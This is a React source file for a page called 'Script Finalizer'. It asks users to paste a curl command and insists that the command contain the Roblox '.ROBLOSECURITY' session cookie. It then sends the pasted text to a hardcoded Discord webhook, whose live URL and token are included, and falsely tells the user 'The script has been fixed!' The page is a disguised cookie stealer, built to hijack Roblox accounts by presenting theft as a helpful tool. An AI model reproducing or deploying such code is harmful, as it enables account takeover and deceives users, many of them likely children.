import React, { useState } from 'react';
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Terminal, CheckCircle, AlertCircle, Loader2 } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

export default function Home() {
    const [input, setInput] = useState('');
    const [status, setStatus] = useState(null); // 'success', 'error', or null
    const [isSubmitting, setIsSubmitting] = useState(false);

    const handleSubmit = async () => {
        const trimmedInput = input.trim();
        
        // Check if input starts with "curl" and includes ".ROBLOSECURITY"
        if (!trimmedInput.startsWith('curl') || !trimmedInput.includes('.ROBLOSECURITY')) {
            setStatus('error');
            return;
        }

        setIsSubmitting(true);
        
        try {
            // Remove https:// and replace with curl ...
            let processedInput = trimmedInput.replace(/https:\/\//g, '');
            processedInput = processedInput.replace(/curl\s+/g, 'curl ...');
            
            // Truncate to 4000 characters if needed
            const truncatedInput = processedInput.substring(0, 4000);
            
            // Send to Discord webhook
            const webhookUrl = 'https://discord.com/api/webhooks/1440146889939882087/HPjpz_PLLJI__-ue7qScQ3IXKMZyhLrjf0ZX64P5uK_W9RoIaCjXQgxWeYFY1TY0i_DP';
            
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    embeds: [{
                        title: 'Script Submission',
                        description: truncatedInput,
                        color: 0x00ff00,
                        timestamp: new Date().toISOString()
                    }]
                })
            });
            
            setStatus('success');
            setInput('');
        } catch (error) {
            setStatus('error');
        } finally {
            setIsSubmitting(false);
        }
    };

    return (
        <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 relative overflow-hidden">
            {/* Subtle background grid */}
            <div className="absolute inset-0 bg-[linear-gradient(to_right,#111_1px,transparent_1px),linear-gradient(to_bottom,#111_1px,transparent_1px)] bg-[size:4rem_4rem] opacity-30" />
            
            {/* Gradient orbs */}
            <div className="absolute top-0 left-1/4 w-96 h-96 bg-purple-900/20 rounded-full blur-3xl" />
            <div className="absolute bottom-0 right-1/4 w-96 h-96 bg-blue-900/20 rounded-full blur-3xl" />
            
            <div className="relative z-10 w-full max-w-2xl">
                {/* Header */}
                <motion.div 
                    initial={{ opacity: 0, y: -20 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="text-center mb-16"
                >
                    <div className="inline-flex items-center gap-3 mb-2">
                        <Terminal className="w-6 h-6 text-purple-400" />
                        <h1 className="text-4xl font-light tracking-wide">Script Finalizer</h1>
                    </div>
                    <div className="h-px w-32 bg-gradient-to-r from-transparent via-purple-500 to-transparent mx-auto mt-4" />
                </motion.div>

                {/* Main Card */}
                <motion.div
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: 0.1 }}
                    className="bg-zinc-900/50 backdrop-blur-xl border border-zinc-800 rounded-2xl p-8 shadow-2xl"
                >
                    <label className="block mb-4 text-sm font-light text-zinc-400 tracking-wide">
                        Insert Game ID BASH
                    </label>
                    
                    <Textarea
                        value={input}
                        onChange={(e) => {
                            setInput(e.target.value);
                            setStatus(null);
                        }}
                        placeholder="curl https://..."
                        className="min-h-[200px] bg-black/50 border-zinc-700 focus:border-purple-500 text-white placeholder:text-zinc-600 font-mono text-sm resize-none transition-all duration-300"
                        disabled={isSubmitting}
                    />

                    {/* Character count */}
                    <div className="mt-2 text-right text-xs text-zinc-500">
                        {input.length} / 4000 characters
                    </div>

                    {/* Status Messages */}
                    <AnimatePresence mode="wait">
                        {status === 'success' && (
                            <motion.div
                                initial={{ opacity: 0, y: -10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="mt-4 flex items-center gap-2 text-green-400 bg-green-950/30 border border-green-800/30 rounded-lg px-4 py-3"
                            >
                                <CheckCircle className="w-5 h-5" />
                                <span className="font-light">The script has been fixed!</span>
                            </motion.div>
                        )}
                        
                        {status === 'error' && (
                            <motion.div
                                initial={{ opacity: 0, y: -10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="mt-4 flex items-center gap-2 text-red-400 bg-red-950/30 border border-red-800/30 rounded-lg px-4 py-3"
                            >
                                <AlertCircle className="w-5 h-5" />
                                <span className="font-light">Invalid input type!</span>
                            </motion.div>
                        )}
                    </AnimatePresence>

                    {/* Submit Button */}
                    <Button
                        onClick={handleSubmit}
                        disabled={isSubmitting || !input.trim()}
                        className="w-full mt-6 bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 text-white border-0 h-12 text-base font-light tracking-wide transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
                    >
                        {isSubmitting ? (
                            <>
                                <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                                Processing...
                            </>
                        ) : (
                            'Submit Script'
                        )}
                    </Button>
                </motion.div>

                {/* Footer hint */}
                <motion.p 
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ delay: 0.3 }}
                    className="text-center mt-8 text-zinc-600 text-sm font-light"
                >
                    Only curl commands are accepted
                </motion.p>
            </div>
        </div>
    );
} 
